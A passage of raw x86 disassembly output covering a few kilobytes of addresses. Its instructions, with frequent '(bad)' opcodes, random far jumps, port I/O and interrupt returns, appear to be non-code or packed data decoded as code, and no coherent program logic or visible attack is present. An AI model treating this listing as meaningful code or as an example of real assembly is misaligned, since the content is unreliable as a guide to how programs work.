  421a36:	sub    al,0x4
  421a38:	stos   DWORD PTR es:[edi],eax
  421a39:	mov    DWORD PTR [esi-0x480f05d],ebx
  421a3f:	jae    0x4219fa
  421a41:	push   ss
  421a42:	push   esi
  421a43:	test   DWORD PTR [ebx-0x7b01497f],ebx
  421a49:	scas   al,BYTE PTR es:[edi]
  421a4a:	sbb    dl,dh
  421a4c:	jmp    0x5fde:0x5c9e060d
  421a53:	daa    
  421a54:	lahf   
  421a55:	xchg   DWORD PTR [edi+ebp*4+0x1b],edx
  421a59:	mov    ch,0xd9
  421a5b:	mov    edx,0x62870440
  421a60:	out    0x80,al
  421a62:	inc    eax
  421a63:	test   BYTE PTR es:[edx-0x4482c7b3],al
  421a6a:	(bad)  
  421a6b:	imul   DWORD PTR [ebp-0x44b3f567]
  421a71:	xchg   esi,eax
  421a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a73:	std    
  421a74:	jp     0x421a58
  421a76:	mov    edx,0x92d58166
  421a7b:	aam    0x22
  421a7d:	xchg   DWORD PTR [edi+0x5b],ecx
  421a80:	mov    bh,0x6d
  421a82:	les    ecx,FWORD PTR [edx+0x457a023f]
  421a88:	test   eax,0xdf1d0afa
  421a8d:	pop    ebp
  421a8e:	mov    DWORD PTR [edx],esi
  421a90:	mov    cs,WORD PTR [ebp+ecx*4-0x25]
  421a94:	iret   
  421a95:	pop    ss
  421a96:	inc    ebx
  421a97:	push   ebx
  421a98:	sub    eax,0x15ce4f3e
  421a9d:	pop    edi
  421a9e:	pop    esp
  421a9f:	pop    eax
  421aa0:	adc    DWORD PTR [ebx],esi
  421aa2:	inc    ebp
  421aa3:	fisubr WORD PTR [ecx+0x4b7a33e5]
  421aa9:	lock mov edi,DWORD PTR ds:0xb28791cb
  421ab0:	imul   edx,DWORD PTR [ebp-0x42],0xeaee62fa
  421ab7:	icebp  
  421ab8:	or     al,0x27
  421aba:	sub    DWORD PTR [edx+0x74],ebx
  421abd:	fidiv  DWORD PTR [edx-0x3c]
  421ac0:	std    
  421ac1:	xor    ecx,esp
  421ac3:	inc    ebx
  421ac4:	int    0xbb
  421ac6:	adc    al,0x95
  421ac8:	(bad)  [edx+0x2a59c280]
  421ace:	cmp    eax,0x4b77735
  421ad3:	or     eax,ebx
  421ad5:	jbe    0x421abb
  421ad7:	jae    0x421aa0
  421ad9:	nop
  421ada:	mov    ds:0x46a036c3,al
  421adf:	xchg   esi,eax
  421ae0:	jle    0x421b1c
  421ae2:	inc    edi
  421ae3:	push   ss
  421ae4:	jns    0x421ab3
  421ae6:	push   cs
  421ae7:	out    dx,al
  421ae8:	pop    esi
  421ae9:	int3   
  421aea:	mov    al,0x61
  421aec:	push   ss
  421aed:	xchg   edi,eax
  421aee:	cmc    
  421aef:	(bad)  
  421af0:	jb     0x421ab8
  421af2:	adc    BYTE PTR [ebx],cl
  421af4:	jb     0x421ade
  421af6:	and    edx,eax
  421af8:	into   
  421af9:	sbb    bl,dh
  421afb:	add    esp,eax
  421afd:	jl     0x421b15
  421aff:	int3   
  421b00:	jmp    0x6c6b66a3
  421b05:	jle    0x421afa
  421b07:	loope  0x421a89
  421b09:	sbb    bh,BYTE PTR [ecx-0x2714f174]
  421b0f:	imul   ebx,DWORD PTR [edi+0x0],0x0
	...
  421b71:	add    BYTE PTR [eax],al
  421b73:	add    BYTE PTR [esi],dl
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dl,bl
  421b81:	aas    
  421b82:	int3   
  421b83:	xchg   ebp,eax
  421b84:	mov    ebx,0x5000167
  421b89:	add    DWORD PTR [eax],eax
  421b8b:	add    al,ch
  421b8d:	inc    edi
  421b8e:	inc    ebx
  421b8f:	fdiv   DWORD PTR [eax-0x67536a98]
  421b95:	jmp    DWORD PTR [ecx+edi*4-0x51]
  421b99:	push   edi
  421b9a:	add    BYTE PTR ds:[ebp-0x6],ah
  421b9e:	into   
  421b9f:	jno    0x421b4b
  421ba1:	xchg   ebx,eax
  421ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ba3:	(bad)  [edx+esi*4]
  421ba6:	outs   dx,DWORD PTR ds:[esi]
  421ba7:	pop    esp
  421ba8:	fcom   QWORD PTR [edi+0x5a7091bb]
  421bae:	ins    BYTE PTR es:[edi],dx
  421baf:	pop    ss
  421bb0:	(bad)  
  421bb1:	call   0xe32f:0xd6cd7a3f
  421bb8:	test   BYTE PTR [edi-0x130f8b0d],bl
  421bbe:	xchg   esi,eax
  421bbf:	rcr    DWORD PTR [edi+0x5043cd0d],0x9b
  421bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bc7:	xor    al,0x8f
  421bc9:	inc    edx
  421bca:	and    ch,dh
  421bcc:	mov    ch,0x24
  421bce:	rcr    BYTE PTR [ebp-0x2eeb64de],1
  421bd4:	adc    eax,0x877f34f3
  421bd9:	ds xchg ecx,eax
  421bdb:	sub    ah,bl
  421bdd:	mov    ebx,0x50234d2f
  421be2:	les    ebp,FWORD PTR [esi-0x61]
  421be5:	jg     0x421c37
  421be7:	jns    0x421bf1
  421be9:	imul   edx,DWORD PTR [esi+0x464470bc],0xbdb453f1
  421bf3:	jae    0x421b7b
  421bf5:	inc    esp
  421bf6:	mov    DWORD PTR [edi],edi
  421bf8:	clc    
  421bf9:	fistp  QWORD PTR [ecx+0x13]
  421bfc:	push   esi
  421bfd:	imul   edx,DWORD PTR [eax+0x36],0xb15e802a
  421c04:	mov    dh,0xce
  421c06:	push   edx
  421c07:	scas   eax,DWORD PTR es:[edi]
  421c08:	fimul  WORD PTR [eax]
  421c0a:	sbb    al,0x5e
  421c0c:	jns    0x421c2c
  421c0e:	sbb    ebx,esi
  421c10:	scas   eax,DWORD PTR es:[edi]
  421c11:	adc    eax,0x5381e34e
  421c16:	nop
  421c17:	push   esi
  421c18:	fistp  QWORD PTR [esi]
  421c1a:	js     0x421c16
  421c1c:	mov    ds:0xbc70bfdc,al
  421c21:	pusha  
  421c22:	push   ebx
  421c23:	mov    ecx,0xaccb5a67
  421c28:	mov    edx,0x54dee2bc
  421c2d:	jp     0x421c21
  421c2f:	test   al,0x2c
  421c31:	in     eax,0x65
  421c33:	add    eax,DWORD PTR [ecx+0x11]
  421c36:	mov    al,ds:0xadc9956c
  421c3b:	lods   eax,DWORD PTR ds:[esi]
  421c3c:	fadd   DWORD PTR [ebp-0x36]
  421c3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c40:	std    
  421c41:	jb     0x421c73
  421c43:	jb     0x421c55
  421c45:	jle    0x421c38
  421c47:	lds    edx,FWORD PTR [edi]
  421c49:	ror    DWORD PTR [ebp*8+0x4f5b9bcf],1
  421c50:	ret    
  421c51:	inc    ecx
  421c52:	xor    esp,DWORD PTR [edi-0x69]
  421c55:	xchg   edx,eax
  421c56:	or     al,0x47
  421c58:	daa    
  421c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c5a:	iret   
  421c5b:	imul   ecx,eax,0xb4501f93
  421c61:	jl     0x421c95
  421c63:	fnsave [ebp-0x6000ca1a]
  421c69:	push   esp
  421c6a:	test   al,0xc5
  421c6c:	bound  eax,QWORD PTR [esi]
  421c6e:	fwait
  421c6f:	pop    ebp
  421c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c71:	cmp    DWORD PTR [ecx],eax
  421c73:	adc    BYTE PTR [esi-0x63],ch
  421c76:	dec    esi
  421c77:	ror    BYTE PTR [eax-0x60],0x9e
  421c7b:	or     eax,0xef5bf147
  421c80:	pop    es
  421c81:	mov    dh,0x6e
  421c83:	adc    cl,BYTE PTR [esi-0x7b004b2b]
  421c89:	aaa    
  421c8a:	sbb    al,0xfb
  421c8c:	pop    ebx
  421c8d:	jp     0x421cc8
  421c8f:	cmp    DWORD PTR [edx],ecx
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	mov    edx,0xc0ed74d2
  421d05:	push   0x1050001
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	xor    edi,ebx
  421d0e:	pop    edx
  421d0f:	sahf   
  421d10:	pop    edi
  421d11:	mov    DWORD PTR [ebp-0x2912dddf],ebx
  421d17:	mov    esp,0x178a5da2
  421d1c:	ss sti 
  421d1e:	retf   
  421d1f:	call   0x1d60:0xbf174ac5
  421d26:	and    eax,0xe6d898b8
  421d2b:	(bad)  
  421d2c:	xchg   edi,eax
  421d2d:	xor    bh,bh
  421d2f:	pop    ecx
  421d30:	stc    
  421d31:	dec    edx
  421d32:	(bad)
  421d35:	sub    ebx,0x9b524c15
  421d3b:	sbb    esi,DWORD PTR [ecx-0x1d]
  421d3e:	inc    edi
  421d3f:	in     al,0x4b
  421d41:	neg    DWORD PTR [edi]
  421d43:	jmp    0x52b1634b
  421d48:	pop    edi
  421d49:	add    eax,0x5a4d4c25
  421d4e:	sbb    BYTE PTR ds:0xaea6d4de,dh
  421d54:	push   edi
  421d55:	shl    DWORD PTR [edx],1
  421d57:	jmp    0xdc55:0x93772c9
  421d5e:	leave  
  421d5f:	js     0x421ce4
  421d61:	out    dx,al
  421d62:	sub    ebp,DWORD PTR [ecx+0x6b]
  421d65:	loopne 0x421dcb
  421d67:	in     eax,dx
  421d68:	cmc    
  421d69:	xor    edi,DWORD PTR [edx-0x52]
  421d6c:	pusha  
  421d6d:	jg     0x421d2d
  421d6f:	retf   0x4ba5
  421d72:	and    BYTE PTR [edi+0x13],dl
  421d75:	and    eax,0xed0727fa
  421d7a:	pop    es
  421d7b:	int    0xc8
  421d7d:	loope  0x421d79
  421d7f:	pop    esi
  421d80:	jns    0x421dff
  421d82:	ret    0x4dd5
  421d85:	dec    eax
  421d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d87:	lods   al,BYTE PTR ds:[esi]
  421d88:	out    dx,eax
  421d89:	iret   
  421d8a:	dec    edx
  421d8b:	popa   
  421d8c:	inc    ebp
  421d8d:	or     bh,dl
  421d8f:	push   0x4457b7e7
  421d94:	xchg   esp,eax
  421d95:	xor    al,0x3b
  421d97:	or     eax,0x714e2134
  421d9c:	data16 lahf 
  421d9e:	mov    ecx,0x44a222d2
  421da3:	pop    edx
  421da4:	or     eax,0x9719afbd
  421da9:	and    ebp,DWORD PTR [edx]
  421dab:	xor    cl,0x85
  421dae:	mov    ebp,0x2eae155e
  421db3:	not    BYTE PTR [edx-0x19c93176]
  421db9:	xchg   ecx,eax
  421dba:	jmp    0x84fb:0xb4bdc40b
  421dc1:	inc    ecx
  421dc2:	xlat   BYTE PTR ds:[ebx]
  421dc3:	and    eax,0x87f2b809
  421dc8:	in     al,dx
  421dc9:	push   0x21e6ebc
  421dce:	xor    eax,0x26dee6cd
  421dd3:	mov    DWORD PTR [ebx+0x795f5b1c],eax
  421dd9:	aas    
  421dda:	iret   
  421ddb:	jmp    0x5355b3eb
  421de0:	outs   dx,DWORD PTR ds:[esi]
  421de1:	add    bl,BYTE PTR ds:0xd13cc389
  421de7:	dec    edx
  421de8:	jl     0x421e5c
  421dea:	daa    
  421deb:	mov    cl,0x1f
  421dee:	dec    edx
  421def:	push   0xffffffd6
  421df1:	test   al,0x5
  421df3:	inc    ecx
  421df4:	aaa    
  421df5:	push   0x36323245
  421dfa:	mov    ah,BYTE PTR [ebx+0x5b]
  421dfd:	ret    
  421dfe:	push   ss
  421dff:	jp     0x421d91
  421e01:	jmp    0xea56:0x86968b75
  421e08:	push   ecx
  421e09:	xchg   edx,eax
  421e0a:	lock xchg edi,eax
  421e0c:	ds cs xchg ebx,eax
  421e0f:	cmp    edx,esp
	...
  421e71:	add    BYTE PTR [eax],al
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e81:	cli    
  421e82:	mov    ch,0xa2
  421e84:	lds    ebp,FWORD PTR [ecx+0x1]
  421e87:	add    BYTE PTR ds:0xb5000001,al
  421e8d:	mov    ebp,0xb1393494
  421e92:	mov    ecx,0x429bb4bd
  421e97:	stos   DWORD PTR es:[edi],eax
  421e98:	pop    esp
  421e99:	mov    eax,ds:0xc29499e7
  421e9e:	cli    
  421e9f:	ins    BYTE PTR es:[edi],dx
  421ea0:	pop    esp
  421ea1:	ficomp DWORD PTR [esi+ecx*1-0xd08c0a3]
  421ea8:	inc    eax
  421ea9:	xchg   esi,eax
  421eaa:	cmp    ebx,DWORD PTR [ecx-0x77ff9f58]
  421eb0:	rcr    edi,cl
  421eb2:	cli    
  421eb3:	cld    
  421eb4:	push   ds
  421eb5:	pushf  
  421eb6:	sub    BYTE PTR [eax+esi*2+0x4ce031de],al
  421ebd:	xlat   BYTE PTR ds:[ebx]
  421ebe:	dec    esi
  421ebf:	ss pop esi
  421ec1:	jno    0x421efd
  421ec3:	and    dh,bh
  421ec5:	pop    edx
  421ec6:	xor    al,0x70
  421ec8:	das    
  421ec9:	dec    ebp
  421eca:	jbe    0x421eec
  421ecc:	stos   DWORD PTR es:[edi],eax
  421ecd:	cmp    al,0xef
  421ecf:	jne    0x421e94
  421ed1:	(bad)  
  421ed4:	vpsllw ymm5,ymm5,xmm5
  421ed8:	or     DWORD PTR [edx],esp
  421eda:	call   0x972eade1
  421edf:	xor    eax,0x15a2fa88
  421ee4:	into   
  421ee5:	out    0xf5,al
  421ee7:	pusha  
  421ee8:	mov    WORD PTR [ebp-0x16],fs
  421eeb:	leave  
  421eec:	in     eax,0x3
  421eee:	ss ret 
  421ef0:	jge    0x421f4f
  421ef2:	mov    ah,0x63
  421ef4:	sti    
  421ef5:	and    al,0x82
  421ef7:	aaa    
  421ef8:	mov    esi,?
  421efa:	mov    ds:0x6c8dff90,eax
  421eff:	repz mov edi,0x44d6ec10
  421f05:	call   0xab7f:0xd601ce15
  421f0c:	adc    DWORD PTR [ebx+eax*1+0x5d],ebx
  421f10:	mov    WORD PTR [ecx],es
  421f12:	(bad)  
  421f13:	shl    BYTE PTR [edi],cl
  421f15:	scas   eax,DWORD PTR es:[edi]
  421f16:	mov    bh,bl
  421f18:	sub    al,0xf8
  421f1a:	jg     0x421f6d
  421f1c:	mov    ebp,0x462fc915
  421f21:	movlps xmm7,QWORD PTR [ebp+0x71]
  421f25:	leave  
  421f26:	mov    al,0xee
  421f28:	popf   
  421f29:	stos   DWORD PTR es:[edi],eax
  421f2a:	retf   0x2a10
  421f2d:	push   edi
  421f2e:	mov    dl,0x59
  421f30:	cmc    
  421f31:	push   0xbaddfe02
  421f36:	nop
  421f37:	call   0x712b:0xfbb5092b
  421f3e:	in     al,dx
  421f3f:	test   BYTE PTR ds:0xb3278bbc,dl
  421f45:	(bad)  
  421f46:	xchg   edi,eax
  421f47:	in     eax,dx
  421f48:	add    al,0x1e
  421f4a:	mov    eax,ds
  421f4c:	mov    esi,0xef9c0ae9
  421f51:	das    
  421f52:	ror    DWORD PTR [esi-0x18],0x72
  421f56:	jl     0x421f12
  421f58:	push   ebx
  421f59:	mov    dh,0xe4
  421f5b:	mov    ecx,0x44dd95ae
  421f60:	(bad)
  421f63:	push   0xffffffd5
  421f65:	or     al,0x5b
  421f67:	jecxz  0x421f60
  421f69:	sbb    esi,DWORD PTR [edi-0x3e5f65a5]
  421f6f:	add    cl,BYTE PTR [edi-0x35]
  421f72:	push   es
  421f73:	cmp    ebx,DWORD PTR [ebp+0xb]
  421f76:	and    ecx,DWORD PTR [edx-0x37]
  421f79:	inc    esi
  421f7a:	pushf  
  421f7b:	inc    edx
  421f7c:	sahf   
  421f7d:	(bad)  
  421f7e:	and    al,0x8f
  421f80:	push   ds
  421f81:	inc    eax
  421f82:	or     ecx,DWORD PTR ds:0xa33c9d9e
  421f88:	sahf   
  421f89:	scas   al,BYTE PTR es:[edi]
  421f8a:	sbb    cl,cl
  421f8c:	in     eax,dx
  421f8d:	push   0xffffffe8
  421f8f:	add    BYTE PTR [edi],0x0
	...
  421ff2:	add    BYTE PTR [eax],al
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 (bad) 
  422001:	push   dx
  422003:	and    dl,cl
  422005:	push   0x1
  422007:	add    BYTE PTR ds:0x4a000001,al
  42200d:	jge    0x421fec
  42200f:	jb     0x421ff9
  422011:	mov    BYTE PTR [ebx+0x25400bfe],cl
  422017:	push   es
  422018:	add    al,0x8f
  42201a:	cmc    
  42201b:	ins    BYTE PTR es:[edi],dx
  42201c:	sub    dl,BYTE PTR [esi+ebp*4+0x35]
  422020:	jl     0x42203e
  422022:	retf   0xd241
  422025:	push   ebp
  422026:	add    ebx,DWORD PTR [edx]
  422028:	ror    BYTE PTR [edx],1
  42202a:	loope  0x422082
  42202c:	jmp    FWORD PTR [ebp-0x60]
  42202f:	push   esi
  422030:	xchg   DWORD PTR [edx-0x2e36f69c],ebx
  422036:	test   dl,0x79
  422039:	or     dl,bl
  42203b:	dec    esp
  42203c:	mov    eax,0x3a911dc8
  422041:	lods   eax,DWORD PTR ds:[esi]
  422042:	mov    ds:0x3ff77a71,al
  422047:	push   ebx
  422048:	mov    ebp,0x56169997
  42204d:	cmp    ebp,edx
  42204f:	mov    esp,0xcc08b669
  422054:	mov    ds:0x96afed11,eax
  422059:	adc    DWORD PTR [eax],edi
  42205b:	adc    eax,0xe413cffc
  422060:	test   al,0x5c
  422062:	xchg   ecx,eax
  422063:	or     ah,BYTE PTR [edx-0xc6de01b]
  422069:	pop    edx
  42206a:	xchg   DWORD PTR [edx+0xd9e512b],edi
  422070:	mov    esi,0x62e3f9fb
  422075:	xchg   edx,eax
  422076:	xchg   ecx,eax
  422077:	or     BYTE PTR [ecx-0xd],bh
  42207a:	push   0x3b
  42207c:	jge    0x4220e5
  42207e:	test   eax,0xf835b253
  422083:	sub    eax,0x69fcca81
  422088:	mov    BYTE PTR ds:0x208ceced,al
  42208e:	call   0xdfcf0661
  422093:	iret   
  422094:	inc    ebx
  422095:	pop    eax
  422096:	rcr    DWORD PTR [eax-0x495ea0d7],cl
  42209c:	aam    0xc7
  42209e:	cmp    BYTE PTR [esi-0x46daf831],ah
  4220a4:	jb     0x422078
  4220a6:	inc    edi
  4220a7:	pmulhw mm3,QWORD PTR [ebx]
  4220aa:	sub    BYTE PTR [edx+0x796c7f0],0x4
  4220b1:	mov    BYTE PTR ds:0x763a26ff,cl
  4220b7:	sbb    al,0xb4
  4220b9:	out    0x16,al
  4220bb:	jno    0x42207f
  4220bd:	scas   eax,DWORD PTR es:[edi]
  4220be:	int    0xc7
  4220c0:	mov    ds,WORD PTR [ecx]
  4220c2:	ins    DWORD PTR es:[edi],dx
  4220c3:	inc    eax
  4220c4:	cld    
  4220c5:	dec    edi
  4220c6:	addr16 push ebp
  4220c8:	mov    bl,0xf7
  4220ca:	inc    edx
  4220cb:	js     0x422077
  4220cd:	jmp    0xf6be:0x5026aab8
  4220d4:	aam    0x48
  4220d6:	stos   BYTE PTR es:[edi],al
  4220d7:	xchg   ecx,eax
  4220d8:	and    DWORD PTR [ebx+edx*4-0xfe16997],esp
  4220df:	sahf   
  4220e0:	add    BYTE PTR [ebx],al
  4220e2:	repnz inc ecx
  4220e4:	jo     0x4220eb
  4220e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220e7:	repz or ecx,DWORD PTR [edi-0xa87b646]
  4220ee:	mov    ds:0x91a9f0df,eax
  4220f3:	mov    ss,edx
  4220f5:	sub    eax,0x4ad8a3e8
  4220fa:	fild   DWORD PTR [eax-0x2a]
  4220fd:	mov    esp,0xe9130fde
  422102:	out    dx,eax
  422103:	mov    dh,0x5b
  422105:	outs   dx,BYTE PTR ds:[esi]
  422106:	pop    eax
  422107:	ins    BYTE PTR es:[edi],dx
  422108:	adc    BYTE PTR [ecx+0x6d],bh
  42210b:	adc    al,0x72
  42210d:	jnp    0x42216a
  42210f:	jo     0x422171
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    edi,DWORD PTR [ecx]
  422181:	loopne 0x4221a1
  422183:	into   
  422184:	iret   
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0x26000001
  42218d:	not    edx
  42218f:	pop    ss
  422190:	pop    ecx
  422191:	ja     0x42212a
  422193:	sub    BYTE PTR [edi],bl
  422195:	and    BYTE PTR [eax],cl
  422197:	(bad)  
  422198:	lods   eax,DWORD PTR ds:[esi]
  422199:	or     DWORD PTR [ebx+0x22116aae],esi
  42219f:	push   ebx
  4221a0:	clc    
  4221a1:	idiv   DWORD PTR [ebx-0x68]
  4221a4:	stc    
  4221a5:	sbb    BYTE PTR [esi+ebx*2-0x617b10fd],al
  4221ac:	sbb    eax,0x3cf7fb39
  4221b1:	cmp    BYTE PTR [esi],dl
  4221b3:	xchg   BYTE PTR [esi+ebx*1],ah
  4221b6:	ins    DWORD PTR es:[edi],dx
  4221b7:	sbb    al,0x94
  4221b9:	ja     0x422197
  4221bb:	rol    dh,cl
  4221bd:	or     eax,0x9eb43660
  4221c2:	mov    ebp,0x69dce7c3
  4221c7:	cmp    eax,0x26da4c68
  4221cc:	mov    cl,0xdc
  4221ce:	sbb    eax,0xdb0a324a
  4221d3:	mov    dl,0xb8
  4221d5:	jnp    0x4221a8
  4221d7:	add    eax,DWORD PTR [si+0x1]
  4221db:	jnp    0x4221e8
  4221dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221df:	iret   
  4221e0:	pop    ebx
  4221e1:	push   es
  4221e2:	sbb    eax,0xd4e6a6f3
  4221e7:	mov    bl,0x13
  4221e9:	outs   dx,DWORD PTR ds:[esi]
  4221ea:	cmc    
  4221eb:	into   
  4221ec:	int    0x79
  4221ee:	shl    DWORD PTR [ecx],cl
  4221f0:	shl    DWORD PTR [eax],cl
  4221f2:	popf   
  4221f3:	jp     0x422194
  4221f5:	sar    esi,cl
  4221f7:	xor    BYTE PTR [edx],0x78
  4221fa:	fisttp QWORD PTR [ebp-0x38]
  4221fd:	xchg   esp,eax
  4221fe:	fidivr DWORD PTR [edx]
  422200:	pop    edi
  422201:	jb     0x4221d7
  422203:	xchg   esp,eax
  422204:	adc    ecx,DWORD PTR [esi-0x52]
  422207:	fsub   st(7),st
  422209:	push   esi
  42220a:	cwde   
  42220b:	xchg   BYTE PTR [ebp+0xfc7184e],bl
  422211:	mov    ebp,0xdcef504f
  422216:	jecxz  0x4221cf
  422218:	mov    cl,0xa8
  42221a:	pop    edi
  42221b:	add    BYTE PTR [edi-0x3e],0x3e
  42221f:	pop    ebx
  422220:	ins    BYTE PTR es:[edi],dx
  422221:	ret    0xde9
  422224:	inc    edx
  422225:	cld    
  422226:	dec    ebp
  422227:	add    DWORD PTR [edx],ebx
  422229:	sbb    al,0x8b
  42222b:	xlat   BYTE PTR ds:[ebx]
  42222c:	test   al,0xbd
  42222e:	out    0x65,eax
  422230:	inc    ecx
  422231:	pop    ss
  422232:	aam    0x3d
  422234:	jg     0x4222a0
  422236:	ins    BYTE PTR es:[edi],dx
  422237:	int    0xbe
  422239:	test   al,0x44
  42223b:	jg     0x4221f5
  42223d:	jae    0x4222b5
  42223f:	xchg   ebp,eax
  422240:	fist   WORD PTR [ebp+0x66]
  422243:	dec    ecx
  422244:	mov    BYTE PTR [edx-0x39],dh
  422247:	mov    ecx,0xf8b81aee
  42224c:	mov    DWORD PTR [edi],esi
  42224e:	sub    eax,0x1af3ee1
  422253:	push   ecx
  422254:	fimul  DWORD PTR [esi+0x63caf718]
  42225a:	xor    eax,0x16b727b0
  42225f:	cmp    eax,0x6711f216
  422264:	shl    BYTE PTR [esp+ecx*2+0x33],1
  422268:	fmulp  st(3),st
  42226a:	iret   
  42226b:	scas   al,BYTE PTR es:[edi]
  42226c:	sub    ah,bl
  42226e:	jns    0x422295
  422270:	stos   DWORD PTR es:[edi],eax
  422271:	ss mov cl,0xf0
  422274:	dec    esp
  422275:	mov    ds:0xf2fd6e9e,eax
  42227a:	inc    ebx
  42227b:	ds jno 0x42220f
  42227e:	and    al,0xba
  422280:	loop   0x422206
  422282:	clc    
  422283:	inc    ebp
  422284:	sub    al,0x32
  422286:	mov    BYTE PTR [edx],dl
  422288:	xor    BYTE PTR [ecx],cl
  42228a:	sub    BYTE PTR [ebx-0x6a625374],al
  422290:	jae    0x422292
	...
  4222f2:	add    BYTE PTR [eax],al
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	leave  
  422301:	add    ebx,DWORD PTR [edx]
  422303:	test   esp,edx
  422305:	ins    BYTE PTR es:[edi],dx
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0x67000001
  42230d:	(bad)  
  42230e:	aaa    
  42230f:	or     BYTE PTR [edx],bh
  422311:	aam    0xbd
  422313:	frstor [esi+0xbd2c585]
  422319:	pop    eax
  42231a:	cmp    al,0x5c
  42231c:	adc    DWORD PTR [ecx-0xf],esi
  42231f:	jno    0x4222c4
  422321:	pop    esi
  422322:	out    0x76,al
  422324:	or     al,0x24
  422326:	ins    DWORD PTR es:[edi],dx
  422327:	mov    dl,0x3e
  422329:	pop    eax
  42232a:	(bad)
  42232e:	test   DWORD PTR [eax+0x747792fd],0x65812809
  422338:	mov    eax,0x4aaeb916
  42233d:	pop    ds
  42233e:	test   eax,0x21e970f3
  422343:	aaa    
  422344:	ret    0x8a4d
  422347:	mov    BYTE PTR [ecx-0x7f8eecd4],cl
  42234d:	test   dh,0x21
  422350:	rcl    si,cl
  422353:	mov    al,ds:0xb8977777
  422358:	pop    ebp
  422359:	cmp    DWORD PTR [ebx],ebx
  42235b:	test   ebp,ebx
  42235d:	jb     0x422318
  42235f:	aas    
  422360:	fadd   DWORD PTR [ebp+0x24]
  422363:	push   esi
  422364:	rep ins BYTE PTR es:[edi],dx
  422366:	nop
  422367:	jge    0x422372
  422369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42236a:	add    esp,DWORD PTR [edi]
  42236c:	fcomp  DWORD PTR [ecx+0x5e]
  42236f:	add    eax,0xd655717c
  422374:	sbb    BYTE PTR ds:[eax+0x7a7dfe1],ah
  42237b:	scas   eax,DWORD PTR es:[edi]
  42237c:	mov    ds:0xac891308,eax
  422381:	in     al,0xec
  422383:	adc    ah,BYTE PTR fs:[edx+ecx*4]
  422387:	pop    ecx
  422388:	call   0x2f2c787b
  42238d:	mov    dh,0x92
  42238f:	rcl    ebx,1
  422391:	push   ebx
  422392:	aad    0xff
  422394:	xchg   DWORD PTR [edx+0x78702b1f],ebp
  42239a:	rcl    BYTE PTR [edi+0x7d38f345],1
  4223a0:	push   ecx
  4223a1:	inc    ecx
  4223a2:	enter  0x26b,0x3c
  4223a6:	mov    ah,0xc6
  4223a8:	in     al,dx
  4223a9:	sbb    BYTE PTR es:[ebp+0x29],bh
  4223ad:	xor    BYTE PTR [edx-0x45],dl
  4223b0:	out    dx,al
  4223b1:	arpl   WORD PTR [edi+0x7d823d58],dx
  4223b7:	jg     0x4223f4
  4223b9:	hlt    
  4223ba:	xchg   ebp,eax
  4223bb:	mov    tr1,edx
  4223be:	mov    esp,0xf7c907c0
  4223c3:	jae    0x422410
  4223c5:	pop    ds
  4223c6:	ins    DWORD PTR es:[edi],dx
  4223c7:	mov    es,edi
  4223c9:	sub    BYTE PTR [ebx],ch
  4223cb:	mov    ebp,0x3fc31dc8
  4223d0:	jmp    0x9293:0x9a43c2b7
  4223d7:	add    DWORD PTR [ecx+eiz*8+0x600fec10],esp
  4223de:	(bad)  
  4223df:	or     ah,ah
  4223e1:	scas   al,BYTE PTR es:[edi]
  4223e2:	dec    eax
  4223e3:	adc    eax,0x368222e6
  4223e8:	or     BYTE PTR [ebp-0x4dcb2a39],bl
  4223ee:	in     eax,dx
  4223ef:	mov    al,ds:0x555eab99
  4223f4:	inc    esi
  4223f5:	jle    0x4223d0
  4223f7:	ins    BYTE PTR es:[edi],dx
  4223f8:	int3   
  4223f9:	sar    BYTE PTR [edx+0x42cac1f6],0x3b
  422400:	jmp    0x4223de
  422402:	loope  0x4223e2
  422404:	cs push 0x6e
  422407:	call   0x91998cca
  42240c:	fldenv [edx+0xdb1ef9]
	...
  422472:	add    BYTE PTR [eax],al
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	mov    DWORD PTR [esi-0x40],ebx
  422483:	(bad)  
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    eax,0xb1000001
  42248d:	(bad)  
  42248e:	jnp    0x42242b
  422490:	pop    edx
  422491:	inc    eax
  422492:	loope  0x422472
  422494:	and    eax,0x5207bc3a
